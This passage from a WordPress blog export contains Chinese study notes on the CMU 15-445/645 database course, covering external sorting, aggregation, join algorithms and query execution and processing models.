<p>外部排序通常采用分治策略，将K/V对划分为可以装入内存的分段。每个K/V对中的值可能保存了实际的元组数据（Early Materialization），也可能保存了指向数据存储位置的指针（Late Materialization）。递归地对分段进行归并，得到最终结果。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220310105416.png" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:heading {"level":4} -->
<h4>优化措施</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>二路归并排序在内存中只需使用三个帧。读入其中一页进行排序时，可以新开一个线程将另一个页读入内存，即以一种异步I/O的方式进行读写。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>多路归并排序</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>假设有<code>B</code>个可使用的内存页，第一趟将数据集划分为<code>B</code>个大小为<code>N / B</code>的分段。之后每一趟对<code>B-1</code>段进行归并，剩余的一页作为临时结果的缓冲区。每趟归并每一页都会被读和写一次。因此：</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>在B页可用的内存中进行多路归并的趟数 = 1 + [log<sub>B-1</sub>[N/B]]</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>总I/O次数 = 2N·趟数</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>（注：公式中的<code>[]</code>表示向上取整）</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>通过B+树对外部排序进行优化</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>如果在排序的key上已经建立了B+树索引，可以利用索引对排序进行加速。存在以下两种情况：</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>聚簇B+Tree</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>聚簇B+Tree叶结点中记录按照顺序存储，因此直接进行顺序扫描即可。这种情况下不存在计算开销，并且磁盘访问次数是线性的。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>非聚簇B+Tree</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>这种情况下需要通过指针逐个对数据进行访问。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>聚合</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>聚合是将某个属性的多个值合并成一个值。可以通过排序或哈希两种方式实现。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>当输出结果不要求有序时，例如我只需要进行<code>GROUP BY</code>或<code>DISTINCT</code>操作，选择哈希方法实现的计算成本更低。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>排序聚合</h3>
<!-- /wp:heading -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220310105229.png" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><code>DISTINCE</code>操作时先对所有元组进行排序，然后逐个扫描排序后的元组，如果当前元素与上一个元素相同，则直接丢弃。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>哈希聚合</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>第一阶段：根据哈希值将元组划分到不同的桶中，桶装满了以后换出到磁盘。同一个哈希值的桶对应相同分区。Key相同的记录必定在同一个分区。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>第二阶段：对每一个分区建立内存哈希表，并对同一个分区的记录重新进行哈希。当在哈希表中找到当前的key，就对表中的中间结果进行更新，否则插入一个新的记录。该分区所有记录被遍历完后，将哈希表中的记录输出。</p>
<!-- /wp:paragraph -->]]></content:encoded>
		<excerpt:encoded><![CDATA[关系模型没有对数据的实际存储顺序进行限定，有时候查询可能对结果排序有所要求。本节介绍数据库中对元组进行排序或聚合的算法实现。]]></excerpt:encoded>
		<wp:post_id>288</wp:post_id>
		<wp:post_date><![CDATA[2022-03-10 10:58:06]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-03-10 02:58:06]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-03-10 10:58:07]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-03-10 02:58:07]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[09-sorting-aggregations]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="cmu-15-445-645"><![CDATA[CMU15-445/645]]></category>
		<category domain="post_tag" nicename="%e6%95%b0%e6%8d%ae%e5%ba%93"><![CDATA[数据库]]></category>
		<category domain="post_tag" nicename="%e7%b4%a2%e5%bc%95"><![CDATA[索引]]></category>
		<category domain="post_tag" nicename="%e8%ae%a1%e7%ae%97%e6%9c%ba%e6%8a%80%e6%9c%af"><![CDATA[计算机技术]]></category>
		<category domain="category" nicename="conputer-technology"><![CDATA[计算机技术]]></category>
		<category domain="post_tag" nicename="%e8%ae%a1%e7%ae%97%e6%9c%ba%e7%a7%91%e5%ad%a6"><![CDATA[计算机科学]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_thumbnail_id]]></wp:meta_key>
		<wp:meta_value><![CDATA[289]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_layout]]></wp:meta_key>
		<wp:meta_value><![CDATA[inherit]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-disabled]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-insert]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-heading-levels]]></wp:meta_key>
		<wp:meta_value><![CDATA[a:0:{}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-alttext]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-exclude]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[10 Join Algorithms]]></title>
		<link>http://www.ironmanzzm.top/?p=292</link>
		<pubDate>Thu, 10 Mar 2022 16:10:53 +0000</pubDate>
		<dc:creator><![CDATA[protectione055]]></dc:creator>
		<guid isPermaLink="false">https://www.ironmanzzm.top/?p=292</guid>
		<description></description>
		<content:encoded><![CDATA[<!-- wp:paragraph -->
<p>Join操作符将指定属性相等的两个表中元素拼接起来，以计算过程中IO次数作为开销度量。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>Early Materializetion</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>进行Join操作时将两个完整的元组合并到一起。这样做的好处是后续的操作不需要再向底层请求数据。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>Late Materialization</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>进行操作时只拷贝key和元组的存储位置。列式存储的数据库更适合采用该种方法，查询时无需读取不相关的属性。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>Nested Loop Join</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>通过两个for循环逐个比对所有元组，外层循环遍历的表称为outer table，另外一个作为inner table。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>后面将假设Outer table页数为M、有m条元组，inner table页数为N、有n条元组。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>Simple Nested Loop Join</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><img src="https://img.ironmanzzm.top/blog-img/20220309100508.png" alt=""><br>最简单的Nested Loop Join每次循环只读取一个元组。I/O次数=<code>M+(m*N)</code>。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>BLOCK NESTED LOOP JOIN</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><img src="https://img.ironmanzzm.top/blog-img/20220309101252.png" alt=""><br>内外表以块为单位进行合并，带来更少的磁盘访问开销。I/O次数=<code>M+(M*N)</code>。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>Index Nested Loop Join</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>在上面的几种Loop方法中，每一个外表元组通过线性扫描方法找到内表中匹配的元组。如果内表上建立了索引，可以通过索引避免线性扫描带来的开销。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>总结</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Nested Loop Join优化方式就是：1.将元组更少的表作为外表。2.每次循环尽可能一次性读取更多元组。3.使用索引减少内表的访问次数。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>Sort-Merge Join</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>第一阶段根据Join key对内外表进行排序，通常需要使用外部排序算法。第二阶段对两个有序表通过游标进行归并，归并过程中可能需要回溯。<br><img src="https://img.ironmanzzm.top/blog-img/20220309103736.png" alt=""></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>最坏情况下所有join属性的值都相同，merge阶段就退化为Nested Loop，而且排序还有额外的开销。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>以下情况适合采用Sort-Merge Join:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li>至少一个表已经排好序</li><li>输出需要在Join Key上排序</li></ul>
<!-- /wp:list -->

<!-- wp:heading -->
<h2>Hash Join</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>如果两个表中的元素满足join条件，那么它们在该属性上的值一定相等。因此可以使用哈希方法将两个表的元组划分到某个区域，然后只对比落在对应区域中的元组。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>哈希表中的值可以存储实际元组，也可以存储元组的保存位置。后者更适用于列存储数据库。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>Bloom Filter</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Bloom Filter是一种基于概率的位图，可以用来快速判定一个元组是否有可能存在。有可能存在假阳性，但不会出现假阴性。Bloom Fiter占用内存较小，可以作为哈希查找阶段的辅助数据结构。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220309111427.png" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>假设要插入<code>RZA</code>，使用两个哈希函数计算它的哈希值，将对应两个位设置为1。当需要查找一个字符串是否存在时，同样计算两个哈希值，去对应位中看，如果两位都是1，说明有可能存在。如果至少一位上是0，则必不可能存在。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>Grace Hash Join</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>为了解决哈希表无法入内存，搜索时需要随机I/O的问题。出现了Grace Hash Join。使用相同的哈希函数，分别将内外表划分为两个哈希表，搜索时只需要读取编号相同的bucket。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220309112921.png" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>如果出现Bucket也放不下内存的情况，则递归地对其进行划分。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Grace Hash Join划分阶段对表进行一次读一次写，开销为<code>2(M+N)</code>；搜索阶段进行一次读，开销为<code>M+N</code>；因此总开销为<code>3(M+N)</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>当数据库系统知道外表的大小时，可以使用静态哈希表，计算和搜索复杂度会更小。如果不知道大小，则必须使用动态哈希表，或者使用溢出页。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>总结</h2>
<!-- /wp:heading -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220309113602.png" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>哈希方法绝大部分情况下比排序方法更高效。排序只有在数据分布均匀或者结果需要有序的情况下具有较好的表现。好的数据库两者都会使用。</p>
<!-- /wp:paragraph -->]]></content:encoded>
		<excerpt:encoded><![CDATA[本节介绍Join操作符的实现算法。主要分为Nested Loop, Sort-Merge, Hash三种类型。]]></excerpt:encoded>
		<wp:post_id>292</wp:post_id>
		<wp:post_date><![CDATA[2022-03-11 00:10:53]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-03-10 16:10:53]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-03-11 00:10:53]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-03-10 16:10:53]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[10-join-algorithms]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="cmu-15-445-645"><![CDATA[CMU15-445/645]]></category>
		<category domain="post_tag" nicename="%e6%95%b0%e6%8d%ae%e5%ba%93"><![CDATA[数据库]]></category>
		<category domain="post_tag" nicename="%e7%b4%a2%e5%bc%95"><![CDATA[索引]]></category>
		<category domain="post_tag" nicename="%e8%ae%a1%e7%ae%97%e6%9c%ba%e6%8a%80%e6%9c%af"><![CDATA[计算机技术]]></category>
		<category domain="category" nicename="conputer-technology"><![CDATA[计算机技术]]></category>
		<category domain="post_tag" nicename="%e8%ae%a1%e7%ae%97%e6%9c%ba%e7%a7%91%e5%ad%a6"><![CDATA[计算机科学]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_thumbnail_id]]></wp:meta_key>
		<wp:meta_value><![CDATA[293]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_layout]]></wp:meta_key>
		<wp:meta_value><![CDATA[inherit]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-disabled]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-insert]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-heading-levels]]></wp:meta_key>
		<wp:meta_value><![CDATA[a:0:{}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-alttext]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-exclude]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[11 Query Execution - Part 1]]></title>
		<link>http://www.ironmanzzm.top/?p=296</link>
		<pubDate>Fri, 11 Mar 2022 01:31:58 +0000</pubDate>
		<dc:creator><![CDATA[protectione055]]></dc:creator>
		<guid isPermaLink="false">https://www.ironmanzzm.top/?p=296</guid>
		<description></description>
		<content:encoded><![CDATA[<!-- wp:paragraph -->
<p><strong>查询计划</strong>：DBMS将查询需要做的操作排列成一棵树，数据从叶结点流向根结点，最后作为结果输出。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>处理模型</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>DBMS处理模型负责决定如何对查询计划进行处理。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>Iterator Model</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>每个操作符都需要实现<code>Next()</code>函数，每次调用这个函数都会返回一个元组或<code>null</code>。父结点通过循环从子结点获得所有需要处理的数据。又称为<code>Volcano</code>或者<code>Pipeline</code>模型。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220310141941.png" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>迭代器模型几乎用于所有DBMS，支持对元组进行流水线操作。查询处理过程中，有一些操作需要获得所有数据才能继续往下进行，无法按照流水线的方式处理。这些操作称为pipeline breaker，例如<code>order by</code>, 子查询, <code>join</code>, <code>limit</code>等。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>Materialization Model</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>操作符一次读取所有输入进行处理，然后将所有结果一次性输出。DBMS可以设定阈值来避免一次性扫描太多元组的问题。输出可以是整个元组(NSM)或列的子集(DSM)。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220310144723.png" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>实体化模型适合OLTP类型的任务，因为大部分时候只需要访问少量数据。只需要花费很少的执行开销和函数调用。但不适合OLAP，因为存在大量中间结果。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>Vectorized/batch Model</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>操作符每次输出一批元组，批次的大小取决于硬件和查询参数。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><img src="https://img.ironmanzzm.top/blog-img/20220310145843.png" alt=""><br>·<br>适合OLAP，因为减少了每个操作符上的调用次数，而且方便使用向量指令处理数据。大部分主流数据仓库都使用该模型。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>计划处理方向</h2>
<!-- /wp:heading -->

<!-- wp:heading {"level":3} -->
<h3>从上到下</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>从根出发调用子结点的函数，得到需要处理的数据。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>从下到上</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>叶子结点向父结点推送数据。向上传递数据时，如果能确保所处理的数据能够放在CPU缓存和寄存器中，这种方法更合适。但实现上有较大难度。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>访问方法</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>访问方法是DBMS访问存储在表中数据的方法。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>线性扫描</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><img src="https://img.ironmanzzm.top/blog-img/20220310232334.png" alt=""><br>顺序读取表格的每一页，以及每一页中的每个元组。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>优化方法</h4>
<!-- /wp:heading -->

<!-- wp:heading {"level":5} -->
<h5>Zone Page</h5>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><img src="https://img.ironmanzzm.top/blog-img/20220310233416.png" alt=""><br>在页中保存数据的统计信息，如最大值最小值等，在查询时DBMS就可以通过这些统计信息确定是否需要查找该页。OLTP系统中需要频繁更新Zone Page，因此在OLAP系统中使用更多。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":5} -->
<h5>Late Materialization</h5>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><img src="https://img.ironmanzzm.top/blog-img/20220310233553.png" alt=""><br>DSM DBMS尽可能地延迟取得整个元组的时间，减少操作符之间的数据传输量。列式存储模型中，只需要传递数据的位移量即可。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>Index Scan</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>查询优化器需要知道数据的分布情况，从而选择更适合的索引进行查询。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>如果数据库中大部分值都是符合输出条件的，那么使用索引扫描还需要花费额外的索引查找时间，不如直接从头开始进行顺序搜索。选择索引还是顺序搜索是通过数据库系统中查询优化器里的成本模型决定的。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>Index Scan Page Sorting</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>如果是在一个非聚簇索引中对数据进行检索，为了避免频繁的随机I/O，会先通过索引找到所有结果的存储位置，然后按照页号对它们进行排序，再逐页读取。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>Multi-index Scan</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>如果数据库中建立了多个索引，那么可以同时使用多个索引进行搜索，然后将搜索结果合并起来。比如如果查询条件中使用了<code>and</code>/<code>or</code>，那么可以在查询时分别使用两个索引对<code>and</code>/<code>or</code>左右的字段值进行搜索，然后将两边搜索出来的结果取交集/并集。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>pg中该种方法称为Bitmap Scan。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>修改可能造成的问题</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><code>INSERT</code>, <code>UPDATE</code>, <code>DELETE</code>这类对数据库进行修改的操作需要负责检查约束性保证以及更新索引。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220310235453.png" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>假设现在在<code>salary</code>上建立了聚簇索引，并执行一个将所有<code>salary&lt;1100</code>的人工资增加<code>100</code>块，就会出现这样的问题：<code>999</code>增加<code>100</code>后变为<code>1099</code>。将<code>1099</code>插入到索引中后，会被指针第二次遍历到。如果不记录之前已经处理过的元组有哪些，就会被额外增加一次<code>100</code>。这种由于更新操作导致扫描重复访问同一个元组的问题称为<a href="https://en.wikipedia.org/wiki/Halloween_Problem">Halloween Problem</a></p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>Expression Evaluation</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>DBMS将<code>WHERE</code>子句表示成一棵表达式树。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220311000259.png" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>对于每一个元组，DBMS都需要对操作式树进行遍历，这样将会使执行速度变慢。一个更好的方法是类似于JIT编译那样，直接计算表达式。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220311000705.png" alt=""/></figure>
<!-- /wp:image -->]]></content:encoded>
		<excerpt:encoded><![CDATA[DBMS将查询需要做的操作排列成一棵树，查询处理模型负责决定如何对查询计划进行处理。Part1介绍在单结点模式下的查询处理模型。]]></excerpt:encoded>
		<wp:post_id>296</wp:post_id>
		<wp:post_date><![CDATA[2022-03-11 09:31:58]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-03-11 01:31:58]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-03-11 09:31:59]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-03-11 01:31:59]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[11-query-execution-part-1]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="cmu-15-445-645"><![CDATA[CMU15-445/645]]></category>
		<category domain="post_tag" nicename="%e6%95%b0%e6%8d%ae%e5%ba%93"><![CDATA[数据库]]></category>
		<category domain="category" nicename="conputer-technology"><![CDATA[计算机技术]]></category>
		<category domain="post_tag" nicename="%e8%ae%a1%e7%ae%97%e6%9c%ba%e6%8a%80%e6%9c%af"><![CDATA[计算机技术]]></category>
		<category domain="post_tag" nicename="%e8%ae%a1%e7%ae%97%e6%9c%ba%e7%a7%91%e5%ad%a6"><![CDATA[计算机科学]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_thumbnail_id]]></wp:meta_key>
		<wp:meta_value><![CDATA[297]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_layout]]></wp:meta_key>
		<wp:meta_value><![CDATA[inherit]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-disabled]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-insert]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-heading-levels]]></wp:meta_key>
		<wp:meta_value><![CDATA[a:0:{}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-alttext]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-exclude]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[12 Query Execution - Part 2]]></title>
		<link>http://www.ironmanzzm.top/?p=300</link>
		<pubDate>Fri, 11 Mar 2022 02:37:48 +0000</pubDate>
		<dc:creator><![CDATA[protectione055]]></dc:creator>
		<guid isPermaLink="false">https://www.ironmanzzm.top/?p=300</guid>
		<description></description>
		<content:encoded><![CDATA[<!-- wp:paragraph -->
<p>本节介绍任意个节点下的并行执行模型。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>并行vs分布式</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>两者都是将数据库分散到不同的资源上，以改进不同方面的性能。在物理层面无论以何种方式组织，逻辑层面上对上层都应该是透明的，即单节点下得到的结果和并行/分布式下得到的结果应该是一致的。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>并行DBMS：</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li>资源在物理层面上紧密联系</li><li>通过高速总线连接</li><li>连接可以被认为是低成本和可靠的</li></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>分布式DBMS：</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li>资源相互距离比较远</li><li>通过低速信道连接</li><li>存在成本和可靠性问题</li></ul>
<!-- /wp:list -->

<!-- wp:heading -->
<h2>查询执行</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>DBMS中的处理模型定义了如何组织系统以实现多个worker处理并发请求。worker是指DMBS中可以执行某项任务的组件，可以是进程也可以是线程。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>Process per DBMS Worker</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>数据库每次收到请求，由任务分发器<code>Dispatcher</code>创建新的Worker进程负责处理该请求。由于每个请求都具有自己的地址空间，可能会造成同一页在多个进程中拥有重复副本，可以通过共享内存避免重复副本。同时，这种模型不会因为一个worker崩溃而导致其他worker崩溃。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>老式数据库大多采用这种模型，例如postgresSQL。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220311100313.png" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:heading {"level":3} -->
<h3>Process Pool</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>为了减少频繁的进程创建，可以采用进程池技术。进程池中有多余进程时，可以将一部分繁重的任务交由多个进程并行处理，即<code>work-stealing</code>技术。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220311100331.png" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:heading {"level":3} -->
<h3>Thread per DBMS Worker</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
